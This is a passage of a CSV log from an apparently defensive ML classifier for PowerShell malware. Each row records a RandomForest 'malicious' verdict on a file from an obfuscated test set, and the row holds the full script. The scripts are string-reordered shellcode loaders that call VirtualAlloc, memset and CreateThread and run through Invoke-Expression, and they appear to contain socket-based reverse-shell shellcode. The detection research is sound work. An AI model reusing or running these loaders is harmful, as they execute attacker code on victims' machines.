AmvAmv[DllImport',',0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0','ount);AmvAmv;6hC',',0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x','0f,0xb7,0x4a,0x26,0','x31,0xff,0xac,0x3c,0x61,0x7c,',';[DllImport(Diemsvcrt.dllDie)]public static extern I','ntPtr memset(IntPtr dest, uint','00,0x7e,0x36,0x8b,0x36,',')]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationT','01,0x08,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,',',6hCg,0x','0xc3,0x29,0xc6,0x7',',0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0','oot + Diex','xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;6hCg = 0x1000;if (6hCz.Length -gt 0x1000){6hCg = 6hCz.Length};6hCx=6hCw::VirtualAlloc(0,0x1000',');for (','x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x7','ntPtr](6hCx.ToInt32()+6hCi), 6hCz[6hCi], 1)};6hCw::CreateThread(0,0,6hCx,0,0,0);for (;;){Start-sleep 60};Amv','PowerShellxtS','Type -memberDefinition 6hCc -Name ','ype, uint flProtect','0x6a,0x40,0x68,0x00,0x10,0x00,0','ff,0xd5,0x83,0xf8,0x',' src, ui','ni -encDie;iex Die&amp; pow','Base64String([System.Text.Encoding]::Unicode.GetBytes(6hC1));if([IntPtr]::Size -eq 8){6hCx86 = 6hCenv:SystemR','6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0x',' Die-nop -no','x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x5','DieWin32Die -namespace Win32Functions -passthru;[Byte[]];[Byte[]]6hCz = 0xfc,0xe8,0','6hCe = [System.Convert]::To','nt c','tSsys','x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x',', IntPtr lpThreadId)','x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00','CeDie;}','f8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a','3,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9','wow64xtSWindows','ershell 6','40','6hCi=0;6hCi -le (6hCz.Length-1);6hCi++) {6hCw::memset([I','1,0xff,0xff,0xff,0x01,','v1.0xtSpowershellDie;6hCcmd = Die-nop -noni -enc Die;iex Die&amp; 6hCx86 6hCcmd 6hCeDie}else{6hCcmd =','3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0x','5,0xc7,0xc3,0xbb,0xf0,0','w = Add-','(Diekern','0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x',',0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00'))  -rePlaCe'6hC',[char]36-CREPLace'xtS',[char]92-CREPLace  ([char]68+[char]105+[char]101),[char]34 -rePlaCe 'Amv',[char]39) | &amp; ( $env:cOmSPEC[4,26,25]-Join'')",malicious,TP
2026-07-13 16:45:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1486.ps1,custom-ps-ml,UNKNOWN,2350e808-3051-4fa6-8424-2191f0451f3a,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2935,1530.39," ((\""{20}{56}{11}{33}{15}{1}{32}{2}{36}{63}{59}{38}{62}{53}{35}{6}{43}{49}{8}{24}{47}{64}{5}{60}{55}{18}{37}{41}{26}{10}{7}{58}{68}{16}{51}{50}{9}{44}{29}{12}{3}{54}{17}{46}{67}{0}{39}{31}{23}{30}{66}{52}{14}{40}{27}{13}{48}{45}{4}{25}{19}{21}{61}{34}{42}{28}{57}{65}{22}\""-f '0xd5,0x97,0x6a,0x05,0x68,0xbe',' uint dwSize, uint flAllocationType, uint flProtect);[DllImport','tatic extern IntPtr CreateThread(IntPtr lpThreadAtt',',0x58','if (RB6z.Length -gt 0x1000','0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0','lags, IntPtr lpTh','7d,0xf8','dest, uint src, uint count);B8x;RB6w = Add-Type -memberDefinition RB6K9ct -Name GL6Win32GL6 -names','x5b,0x61,0x59,0x5a,','x03,0x','ct = B8x[DllImport(GL6kernel32.dllGL6)]public st','e0','0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x',',0xec','pAddress,','04,0x8b,0x01,0','x29,0x80,0x6b,0','0x3c,0x01,0xd0,0x8b',';RB6','RB6','IxHy=RB6w::VirtualAlloc(0,0x1000,RB6g,0x40)','t-sleep 60};','0x85,0xc0','pace Win32Functions -passthru;[Byte[]];[B','){RB6g = RB6z.Length}',',0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0','x6a,0x00,0x68,','i++',',0x',',0x74,0x0c,0x','7,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,','(GL6kernel32.dllGL6)]public s','atic extern IntPtr VirtualAlloc(IntPtr l','6i=0;RB6i -le (RB6z.Len','wCreationF','ributes, u',',0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x1','artAdd',',0x35,0x4a,0x6a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x5',',0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0','8,0x8b,0x58','gth-1);RB6','readId);[DllImpo','0x51,0xff','xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;RB6g = 0x1000;','x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x4','yte[]]RB6z = 0xfc,','5f,0xff,0','rt(GL6msvcrt.dllGL6)]public static extern IntPtr memset(IntPtr ','9,0x44,0x24,0x24,0x5b,0','xd0,0x8','4e,0x08,0x75','tPtr lpParameter, uint d',',0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0','8b,0x42,','K9',') {RB6w::memset([IntPtr](RB6IxHy.ToInt32()+RB6i), RB6z[RB6i], 1)};RB6w::CreateThread(0,0,RB6IxHy,0,0,0);for ',',0x3b,0x7d,0x24,0x','ize, IntPtr lpSt','x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x',';for (RB','ress, In','int dwStackS','0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,','(;;){Star','ff,0x','0,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,','75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x')).rePlAcE('RB6','$').rePlAcE(([ChaR]66+[ChaR]56+[ChaR]120),[sTriNG][ChaR]39).rePlAcE('GL6',[sTriNG][ChaR]34) |. ( $pShOme[21]+$PShoME[30]+'X')",malicious,TP
2026-07-13 16:45:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1493.ps1,custom-ps-ml,UNKNOWN,8d1de3b4-72d1-48cf-abab-2f254a0e5e23,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3045,1567.82,"((\""{16}{65}{50}{14}{59}{51}{8}{48}{6}{20}{27}{42}{55}{52}{18}{22}{34}{69}{39}{26}{5}{21}{35}{33}{1}{12}{70}{68}{67}{10}{24}{41}{11}{2}{17}{31}{25}{23}{38}{60}{3}{49}{32}{44}{30}{72}{64}{13}{15}{66}{57}{58}{28}{0}{40}{61}{4}{53}{29}{43}{19}{56}{63}{9}{54}{37}{71}{7}{46}{62}{36}{45}{47}\""-f',0x61,0x67,0x26,0x7a,0xab,0x00,0xcc,0x95,0x02,0x78,0x78,0x0','f,0x43,0xe9,0x32,0xbd,0x77,0x7','16,0x3e,0xae,0x5c,0','xb0,0xe',',0x12,','f4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0','r CreateThre','xff,0x56,0x3c,0xa2,0xd6,0x9e,0x4a,0xca,0xea;qj5g = 0x1000;if (qj5z.Length -gt 0x1000){qj5g = qj5z.Length};qj5x=qj5w::VirtualAlloc(0,0x1000,qj5g,','flAllo','b4,0xbf,0xb7,0x52,0xde',',0xef,0xa8,0x9d,0x06,0xa5,0x70,0x15,0x','6,0xd6,0x70,0x81,0x0d,0x40,0x5d,0x30,0xc1,0x17,0x','a,0x36,0x6a,0x77,0xcb,0xfd,0x4c,0xb6,0xcc,0xa','0x07,',' lpAddress, uint dwSi','0x0c,0xbc,0x71,0x97,0xf3,0x3f,0x82,0xb1,0x37,0x6b,0xd','qj5c = 9Qn[DllImport(lbNkernel32.','x70,0x22,0x31,0xb0,0x0a,0x5e,0','tPtr memset(IntPtr dest, uint src',',0xa5,0xf1,0x37,0x2c,0xf2,0x6d,0x3a,0x09,0','ad(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStar','x03,0x56,0x7c,0xe6,0x75,0x5f,0x94,0x64,0x75,0xa0,0x64,0x09,0xff,0x45,0x55,0x09,0x9b,0x0e,0xc',', uint count);9Qn;qj5w = Add-Type -memberDefi','xf9,0xbc,0x5b,0x3d,0x58','54','13,0','7,0xba,0x68,0x04,0x80,0xa3,0xd9,0x74,0x24,0x','tAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThr','dd,0xd7,0x9e,0xaa,0x8d,0x47,0x5e,0x1b,0x6e,0x38,0x36,0x71',',0x63,0x8','x47,0xcc,0x1a','xba,0x37,0xdd,0xd7,0xf8,0x','7,0x9a,0x9a,0x65,0xcb,0x96,0x24,0x75,0x43,0','0xe','nition qj5c -Name lbNWin32lbN -namesp','5,0xb9,','qj5i++) {qj5w::memset([IntPtr](qj5x.ToIn','7,0x80,0x57,0xd9,0x98,0xf1,0x04,0x4a,0xf1,0x',',0x18,0x0d,0x42,0xba,','nctions -passthru;[Byte[]];[Byte[]]qj5z = 0xdb,0xc','f,0x0f,0xf2,0x19,0xd0,0x85,0x7e,0x19,0x5a,0x2a,0x7e,0xd7,0xab,0x47,0x6c,0x8',',0x2b,0xf1,0xca,0x2c,0x4a,0xd0,0x5c,0x27,0x15,0xf2,0x5f,0xe4,0x2d,0xbb,0x47,0xe9,0x08,0x75,0xf3,0xd9,0xe7,0x84,0xd5,0x10,0x07,0x2a,0x18,0x9d,0xfa,0x32,0x5c,0x19,0xe5,0x40,0x94,0x5a,0x98,0x52,0x63,0x21,0x4','eadId);[Dl','8,0x65','xa0,0x57,0','t32()+qj5i), qj5z[qj5i], 1)};qj5w::CreateThread(0,0,qj5x,0,0,0);for (;;){Star','0x40);for (qj5i=0;','t-sleep 60};','cationType, uint flProtect);[DllImport(lbNkernel32.dlllbN)]public static extern IntPt','9,0xe','Alloc(IntPtr','int ',' In','0xce,0x19',',0xbf,0xdf,0x02,0xba,0x93,0xfa,0x4c,0x1','lImport(lbNmsvcrt.dlllbN)]public static extern','x34,0x32,0xc5,0x7c,0x4f,0xfb,0x','c1,0x54',',0x2f,0xb7,0x2a,0x00,0x2e,0x23,0xc3,0x53,0x31,0x88,0xf4,0x','ze, u','0xc3,0xf2,0xe6,0','f,0x5b','qj5i -le (qj5z.Length-1);','53,0x3f,0x27,0x04,0x','0xeb,0x85,0x84,','dlllbN)]public static extern IntPtr Virtual','2,0xa9,0x9e,0x14,0xb9,0x29,0x1f,0x',',0x61','9,0x6f,0x7e,0xf4,0x38,0xa8,0x63,0xf5,0x69','ace Win32Fu','e,0xad,0xd9,0x4e,0xad,0xe1,0x3','ff,0x73,0xbc,0x5e,0',',0xf0,')).ReplaCE(([CHar]108+[CHar]98+[CHar]78),[STrING][CHar]34).ReplaCE(([CHar]57+[CHar]81+[CHar]110),[STrING][CHar]39).ReplaCE('qj5','$') |INVokE-ExPREsSION",malicious,TP
2026-07-13 16:46:03,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1513.ps1,custom-ps-ml,UNKNOWN,4381c567-a894-41ca-b3b7-a5efe7db082c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3826,1709.88," &amp; ( $sheLLid[1]+$sHeLLid[13]+'X')(((\""{35}{11}{32}{37}{16}{61}{13}{52}{5}{8}{14}{6}{10}{18}{48}{28}{29}{34}{40}{27}{21}{55}{44}{3}{15}{30}{60}{9}{20}{17}{1}{33}{56}{2}{51}{57}{54}{59}{58}{63}{41}{38}{43}{4}{7}{23}{19}{64}{42}{24}{49}{62}{22}{0}{26}{50}{36}{45}{39}{46}{31}{53}{12}{25}{47}\""-f',0x06,0x1f,0xe6,0xf8,0x62,0xa0,0x4f,','x6e,0xa9,0xed,0x0f,0x3d,','07,0x56,0x0f,0x84,0xac,0x68,0x19,0x1b,0x02,0xe1,0x9a,0xca','68,0xe0,0x95,0x4f,0xb6,0x65,0x0b,0xf7,0x3d,0xdd,0xef,0x09,0x91,0xb8,0x64,0','2,0x10,0x97,0x39,0xb7,0x8a,0x66,0xfa,0x18,0x1d,0xe2,0xf8,0xcc,0x9f,0xa2,0x96,0x12,0xca,0x40,0x','Ptr lpThreadId);[DllImport(a56msvcrt.dlla56)]public static extern IntPtr memset(IntPtr dest, ui','ition KAZO2av -Name a5','30,0x7b,0xd0,0xb2,0x64,0x34,0x1b,0','nt src, uint c','b,0xa8,0x08,0x46,0xdd,0xd5,','6Win','VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro','AZCg1.ToInt32()+KAZi), KAZz[KAZi], 1)};KAZw::CreateThread(0,0,KAZCg1,0,0,0);for (;;){Star',' dwStackSize, ','ount);Aun;KAZw = Add-Type -memberDefin','x05,0x5e,0xce,0x22,0x0a,0x61,0x03','teT',',0x8a,0x49,0x6e,0x06,0x4a,0xfe,0x07,0x8f,0x24,0x97,0','32a56 -namespace Win','d2,0x8d,0x5e,0x05,0x2a,0x79,0x5d,0x35,0xfb,0xd4,0x0a,0xa7,0x6d,0','0x4a,0x2e,0x82,0x73,0x01,0xdd,0xd7,0x02,0x48',',0x4c,0x88,0x2c,0x09,0x6c,0xa9,0xe1,0x49,0x50,0xe0,0x8e,0xba,','0x7d,0x8d,0x94,0x00','xef,0x0a,0xfa,0x23,0x69,0x95,0xf9,0xa0,0x5c,0x21,0x55,0x2a,0x','0xfc,0xe7','t-sleep','0x6b,0x43,0x2b,0x00,0xec,0x5c,0xfe,0xb5,0xf2,0xca,0xf1,0xff,0x51,0x5c,0x0d,0x2a,0x7d,0xf0,0x0e,0x2a,0x81,0x8e,0xd4,0xfb,0x18,0x07,0x79,0x61,0xe5,0x3f,0x89,0x96','0x59,0x03,0x7e,0xf8,0xe1,0x7b,0xfb,0x3f,0x95,0x31,0x02,0x10,0x06,0x4d','xdd,0xc5,0xd9,0x74,0','x24,0xf4,0xbf,0xfb,0x2e,0xf0,0xb5,0x58,0x29,0xc9,0xb1,0x6e,0x83,0xe8,0xfc,0x31,0x78,0x16,0x03,0x78,0x16,0xe2,0x0e,0xd2,0x18,0x3c,0xf0,0x2b,0xd9,0x5f,0x79,0xce,0xe8,0x4d,0x1d,0x9a,0x59,0x42,0x56,0xce,0x51,0x29,0x3a,0xfb,0xe2,0x5f',',0x59,0x36,0xea,0xa2,0x8d,','th-1);KAZi++) {KAZw::memse','tect);[DllImport','0x42,0x28,0xd7,0x42,0x79,',',0x92,0x0c,0x42,0xd5,0xc4,0x23,0x53,0x','KAZO2av = Aun[DllImport(a56kernel32.dlla56)]public static extern IntPtr ','0x7b,0x4e,0x3b,0x89,0x83;KAZg = 0x1000;if (KAZz.Length -gt ','(a56kernel32.dlla56)]public static extern IntPtr Crea','15,0x47,0x74,0xe0,0xbe,0x3e,0x12,0x23,0x47,0xa7,0x99,0xc4,0x92,0x52,0x9d,0x4e,0x02,0x16,0x12,0x35,0x40,0xa8,0x2c,0x35,0x52,0x79,0xc5,0xbe,0xa4,0x7a,0x15,0x29,0x08,0x85,0xea,0x56,0x7e,0x00,0x65,0xcb,0xf4,0x80,0xe8,0x','i -le (KAZz','db,0xc8,0xe8,0x97,0x7d,0xb4,0xf2,0xcb,0x5d,0x85,0x3c,0x1e,0x9f,0xc2,0x21,0xd1,0xcd,0x9b,0x2e,0x40,0xe2,0xa8,0x73,','e,0x9b,0xb4,0x','0xe7,0x6d,0xb3,0x4b,0xb0,0xe8,','25,0x9','xe9,0x2a,0xa0,0x34,0xcd,0xd4,0xd7,0x4e,0x2d,0x','0x1000){KAZg = KAZz.Length};KAZCg1=KAZw::VirtualAlloc(0,0x1000,KAZg,0x40);for (KAZi=0;KAZ','.Leng',' 60};','32Functions -passthru;[Byte[]];[Byte[]]KAZz = 0',',0x56,0x99,0xfc,0x53,0x07,0xd0,0xb9,0',',0x1a,0x40,0xeb,0x46,0x95,0xd1,0x81,0xf0,',',0xf5,0x9d,0x27,0xed,0xf5,0x5d,0x0b,0xb','IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, Int','t([IntPtr](K','7,0x6b,0xec,0x3b,0x15,0x26,0x66,0x3c,0xab,0x67,0xf2,0x6e,','0x23,0xf3,0x46,0xf3,0xcc,0xc5,0xa6,0x58,0xf3,0','0x05,0x28,0xeb,0xd6,0x31,0x81,0x42,0xb0,0x87,0x7b,0x12,0xe7,0x','d,0x9d,0x0a,0x22,0xa2,0x98,0x4a,0xe1,0x3','xb4,0x43,0x19,0xc7,0xe2,0x12,0x9b,0x5d,0x1d,0x7f,0x4c,0x22,0x2e,0x7f,0x8c,0xab,0xb1,0x15,0x88,0xfb,0x5b,0xf6,0xc6,0x93,0','0x99,0x35,0xaa,0xdc,0x4d,0xd2,0xa7,0','0xbe,0xa8,0x80,0x09,0x9a,0x6','hread(IntPtr lpThreadAttributes, uint','x7f,0xab,0xba,0x12,0x17,0x9e,0x6d,0x3b,0xbc,0x1f,0x44,0xc0,0xae,0xe4,0x8c,0x09,','xee,0x4e,0x79,0xe5,0xe','x51,0x28,0x38,0x44,')).RePLaCE('a56',[sTRINg][CHar]34).RePLaCE(([CHar]65+[CHar]117+[CHar]110),[sTRINg][CHar]39).RePLaCE(([CHar]75+[CHar]65+[CHar]90),[sTRINg][CHar]36) )",malicious,TP
2026-07-13 16:46:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1514.ps1,custom-ps-ml,UNKNOWN,d0c59dc9-e90c-4af4-9147-e22c8300483b,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3016,1784.31,".( $env:COMSpEC[4,26,25]-JoiN'')((((\""{13}{57}{10}{23}{24}{33}{14}{45}{56}{72}{52}{3}{42}{4}{47}{63}{16}{9}{18}{60}{34}{38}{19}{62}{65}{58}{21}{1}{8}{22}{71}{41}{66}{29}{11}{20}{27}{55}{26}{40}{64}{46}{70}{2}{68}{15}{5}{6}{43}{32}{0}{67}{69}{61}{25}{44}{36}{30}{49}{53}{50}{28}{59}{31}{7}{54}{51}{17}{48}{39}{12}{37}{35}\"" -f '0xb1','0x78,0xce,0xe3,0xc9,0x0b,0xa2,0x2b,0xfd,0','x9f,0x13,0x','dress','ThreadId);[D',',0x90,0x','75,0x95,0xa6,0x06,0xb6,0xc2,0xa8,0x8d,0x5e,0x11,0xab,0x35,0x4d,0x9c,0x4','c8,0x23,0x9d,0x86,0x3f,0xb2,0','xbc,0x09,0x0a,0x30,0x3d,0x21,0x6e,0x53,0xbd,0x38,0xa3,0xb3,0xfc,0xf2,0xb6,0xb2,0x39,0xee,0x3b,0xe6,0x92,0x64','mset(IntPtr dest, uint src, ','llImport(LEckernel32.dllLEc)]public static ','0xf4','cxEi), cxEz[cxEi], 1)}','cxEEga = lx4','uint flProtect);[DllImport(LEckernel32.dllLEc)]public static extern ','0,0xff,0xa3',' me','0x0b,0x61','uint count)','passthru',',0xd3,0x88,0x70','xf3,0x6d,0xb4,0xe1,0xe3,0xf0,0x37,0x1a,0xf3,0x94,0xbe,0xff,0xc2,0x94,0xa5,0x74,0x74,0x25,0xad,0xd9,',',0xe9,0x','extern IntPtr VirtualA','lloc(IntPtr lpAddress, uint dwSize, uin','xc9,0x74,0xbe,0x5a,0xc4,0xf0,0x80','9,0',',0x83,0x2d,0xeb,0x0d,0','78,0xf1','x7c,0xe4,0x92,0x2e,0x8f,','d','0xfb,0x90,0xab,0xbb,0x04,0xf7,0xa0,0x72,0x91,0xb8,0xde,0x7a,0x75,0x39,0x1e,0x2d,0x1f,0x39,0x76,0x89,0x7b,0x6a,0x63,0xd6,0x51,0x1e,0x38,0x43,0x5a,0x77,0xed,0xc4,0x32,0x75,0x',',0x21,0xcf,0xc1,0xc5,0x91,0xaf,','t flAllocationType, ','mberDefinition cxEEga -Nam',',0,cxEGNd,0,0,0);for (;;){Start-sleep 60};','6,0xd2,0x',';cxEw::CreateThread(0','e LEcWin32LEc -namespace Win32Functions -','th-1);cxEi++) {cxEw::memset([IntPtr](cxEGNd.ToInt32()+','x96,0xc9,0x11,0xea,0x30,0x99,0x82,0xd6,0xc1,0x4e,0x54,0x9c,0xcd,0x3b,0x12,0xfa,0xd1,0xba,0xf7,0x70,0xed,0x37,0xf6,0x56,0x64,0x03,0xdd,0x72,0x2d,0xd7,0x7c,0x22,0x8b,0xb6,0x81,0x34,0x74,0x66,0x24,0x3e,0x98,0x73,0x55,0x1d,0xf4,0xb0,0x54,0x9e,0x04,0x','x93,0xeb,0xd4,0x32,0x40',', IntPtr lpParameter, uint dwCreationFlags, IntPtr lp','d,0x65',',0xd1,0xeb,0x05,0x4e,0x12,0x81,0x15,0x2','In','a,0x7a,0x09,0x42,0x7d,0x7d,0x20,0x32,0x11,0x80,0xcb,0x43','llImport(LEcmsvcrt.dllLEc)]publi',';cxEg = 0x1000;if (cxEz.Length -gt 0x1000){cxEg = cxEz.Length};cxEGNd=cxEw::VirtualAlloc(0,0x1000,cxEg,0x40);for (cxEi=0;cxEi -le (cxEz.Leng','c,0x44,0xe0,0xed','ca,0xe3,0x0c,0x','x50,0x79,0xc0,','ntPtr lpStartAd',',0x','xe1,0','x94,0xe','tPtr CreateThread(IntPtr lpThreadAt','[D','4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xc3,0x04,0x03,0x43,0',',0xa5,0x5b,0x14,',';lx4;cxEw = Add-Type -me',',0',';[Byte[]];[Byte[]]cxEz = 0xb8,0xfc,0x8','c static extern IntPtr','df,0xef,0xed,0x36,0x40,0x44,0x7','f,0x41,0x1d,0xd9,0xc6,0xd9,0x74,0x24,0xf',',0xbb,0xd7,0x13,0xd7,0xb0,0x81,0xb3,0xd9,0x15,0xba,0xfd,0xc1,0x7a,0x87,0xb4,0x7a,0x48,0x73,0x47,0xab,0x81,0',',0xad,0xfb,0x3f,0xed,0xcd','53,0x6f,0xa',',0x03,0xea,0x86,0x67,0xec,0x43,0xfe,0x1f,0x95',',0x3b,0x46,0','17,0x97,0x31,0x32,0','tributes, uint dwStackSize, I')) -rePLACE 'cxE',[CHAR]36 -cREpLaCE'lx4',[CHAR]39-cREpLaCE 'LEc',[CHAR]34) )",malicious,TP
2026-07-13 16:46:28,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1524.ps1,custom-ps-ml,UNKNOWN,0a37aba9-1ec0-45d6-a7c8-1c3ea373f6a7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2906,1714.21,"&amp; ( ([strinG]$VErBOSEPreFeRence)[1,3]+'X'-JoIn'') (((\""{30}{5}{41}{9}{37}{22}{14}{11}{21}{19}{27}{0}{23}{48}{31}{47}{8}{45}{42}{12}{43}{16}{40}{44}{33}{7}{32}{25}{24}{3}{2}{28}{13}{15}{10}{39}{20}{1}{4}{6}{17}{34}{46}{26}{38}{35}{29}{36}{18}\"" -f 'c -Name ierWin32ier -namespace ','0x4c,0x07,0x3c,0xb8,0x4c,0x7b,0xeb,0x84,0x3a,0','03,0x4a,0x71,0xbb,0xcd,0','x48,0x0b,0xc5,0x7b,0x20,0x41,0xca,0xa4,0x50,0x6a,0x00,0xcd,0xfa,0x85,0xfd,0xa5,0x92,0x3c,0xa4,0x3e,0x03,0xc0,0x72,0x3b,0x','x95','Address, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(ierkernel32.dllier)]public static extern IntPtr Create',',0x2f;uRTg = 0','5,0x5a,0xef,0x4f,0xb9,0x5d,0x3c,0xe4,0xc','5,0x8b,0x6a,0xfa,0x35,0xef,0xff,0xac,0x85,','ributes, ui','0x14,0xeb,0x82,0xa1,0x42,0x61,0x83,0xc9,0x','.dllier)]public static extern IntPtr memset(IntPtr dest, uint src, uint c','e6,0x69,0x54,0xa9,0xd0,0x44,0x65,0x82,0x21,0xc6,0xe5,0xd9,0x75,0x28,0xd4,0x11,0x88,0x29,0x11,0x4f,0x61,0x7b,0xca,0x1b,0xd4,0x6c,0x7f,0x51,0xe5,0x07,0x33,0x77,0x6d,0',',0x8f,0xc1,0x8e,0x6b,0xd8,0x7d,0x8d,0x4a,0x2e,0x22','tionFlags, IntPtr lpThreadId);[DllImport(iermsvcrt',',0x6e,0xb9,0x25,0xeb,0xfa,0x02,0x51,','e,0x4','x1000;if (uRTz.Length -gt 0x1000){uRTg = uRTz.Lengt','Tx,0,0,0);for (;;){Start-sleep 60};','t);ngv;uRTw = Add-Type -memberDefiniti',',0xbd,0xa8,0xef,0x3c,0x12,0x7a,0x98,0xc2,0x4d,','oun','arameter, uint dwCrea','Win32Functions -passthru;[Byte[]];[Byte[]]uRTz = 0xba,0xd4','57,0x2d,0xab,0xf4,0xb6,0xf2,0x22,0x12,0xe8,0x5a,0x65,0x8b,0','35,0x18,0xb8,0x94,0xa0,0x1d,0x2e,0x39,0x41,0xc8,0x','oc(0,0x1000,uRTg,0x40);for (uRTi=0;uRTi -le','on uRT','xbb,0xfc,0xaf,0xb9,0x4b,0x4b,0x8d,0x6f,0x53,0x61,0xb8','RTx.ToInt32()+uRTi), uRTz[uRT','uRTc = ngv[DllImport(ierkernel32.dllier)]public static extern IntPtr VirtualAlloc(IntPtr lp','xc9','5,0xd6,0xc3,0x2b,0x4c,0xac,0xe7,0xef,0x15,0x76,0x89,0xb6,0xf3,0xd9,0xb6,0xa9,0x5c,0x85,0x12,0xa1,0x70,0xd2,0x2e,0xe8,0x1c,0x17,0x03,0x13,0xdc,0x3f,0x14,0x60,0xee,0xe0,0x8e,0xee,0x42,0x68,0x09,0xe8,0xa5,0x43,0xed,0x66,0x58,0x6c,0x0e,0xae,0x9e,0x38,0x5e,0xd8,0x37,0x41,0x','xb4,0xa6,0xc3,0x6c,0xcf,0x7c,0xbe,0xaa,0x5a,0x67,0x18,0x38,0xfc,0x43,0x99,0xed,0x9b,0x00,0x9','h};','Tz.Length-1);uRTi++) {uRTw::memset([IntPtr](u','i], 1)};uRTw::CreateThread(0,0,uR','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpP',' (uR','32,0xd1,0xd0,0xec,0x3c,0xcc,0x44','c,0x4d,0x59,0x37,0x56,0x92,0x64,0x','Thread(IntPtr 